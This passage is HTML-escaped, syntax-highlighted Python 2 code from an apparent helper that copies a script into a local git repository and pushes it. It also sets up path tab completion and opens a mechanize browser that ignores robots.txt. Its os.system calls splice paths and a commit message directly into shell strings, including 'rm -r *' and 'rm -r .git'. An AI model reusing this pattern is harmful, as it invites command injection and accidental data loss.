        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cp -r /tmp/codetmp/* &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; rm -r /tmp/codetmp&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cp &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_abs_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;succeed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cd &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; git add . &amp;amp;&amp;amp; git status &amp;amp;&amp;amp; git commit -a -m &#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&#39; &amp;amp;&amp;amp; git remote add origin &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; git push -u origin master&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;comment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote_resp_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;succeed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;push succeed!!!&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;push to git wrong,wrong,wrong,check it!!!&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/.git&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#如果本地local_resp_path存在,且文件夹中有.git,当local_resp_path文件夹中的文件与远程github仓库中的文件不一致时,&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#且远程仓库有本地仓库没有的文件,选择合并本地和远程仓库并入远程仓库,所以这里采用一并重新合并的处理方法,&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#(与上一个if中的情况相比,多了一个合并前先删除本地仓库中的.git文件夹的动作),&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;#虽然当远程仓库中不含本地仓库没有的文件时,不用这么做,但是这样做也可以处理那种情况&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;warning!warning!warning! I will exit! There exists a same name script in local_resp_path(&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s),you should rename your script if you want to upload it to git:)&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filename&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cd &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; rm -r .git&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mkdir /tmp/codetmp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cd &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; cp -r * /tmp/codetmp/ &amp;amp;&amp;amp; rm -r * &amp;amp;&amp;amp; git init &amp;amp;&amp;amp; git pull &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote_resp_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cp -r /tmp/codetmp/* &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; rm -r /tmp/codetmp&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cp &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_abs_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;succeed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;cd &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; git add . &amp;amp;&amp;amp; git status &amp;amp;&amp;amp; git commit -a -m &#39;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s&#39; &amp;amp;&amp;amp; git remote add origin &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;amp;&amp;amp; git push -u origin master&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;local_resp_path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;comment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remote_resp_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;succeed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;push succeed!!!&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;push to git wrong,wrong,wrong,check it!!!&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;


&lt;span class=&quot;c&quot;&gt;#below code are the function about tab key complete with file path&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#------------------------start-of-key-complete-with-file-path--------------------------------&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;readline&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;glob&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;tabCompleter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
        A tab completer that can either complete from
        the filesystem or from a list.
        Partially taken from:
        http://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
        source code:https://gist.github.com/iamatypeofwalrus/5637895
        &quot;&quot;&quot;&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;pathCompleter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
            This is the tab completer for systems paths.
            Only tested on *nix systems
            &quot;&quot;&quot;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;readline&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_line_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;glob&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;glob&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;createListCompleter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
            &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
            This is a closure that creates a method that autocompletes from
            the given list.
            Since the autocomplete function can&#39;t be given a list to complete from
            a closure is used to create the listCompleter function with a list to complete
            from.
            &quot;&quot;&quot;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;listCompleter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;readline&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get_line_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot; &quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ll&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;startswith&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
            &lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;listCompleter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;listCompleter&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tabCompleter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;createListCompleter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ab&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;aa&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bcd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bdf&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;readline&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_completer_delims&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;readline&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_and_bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;tab: complete&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#readline.set_completer(t.listCompleter)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#ans = raw_input(&quot;Complete from list &quot;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#print ans&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;readline&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_completer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathCompleter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#--------------------------end-of-key-complete-with-file-path--------------------------------&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_title_from_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#得到uri对应的title&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;mechanize&lt;/span&gt;
    &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;cookielib&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;br&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mechanize&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Browser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_cookiejar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookielib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LWPCookieJar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Cookie jar&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_handle_equiv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Browser Option&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_handle_gzip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_handle_redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_handle_referer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;br&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;set_handle_robots&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
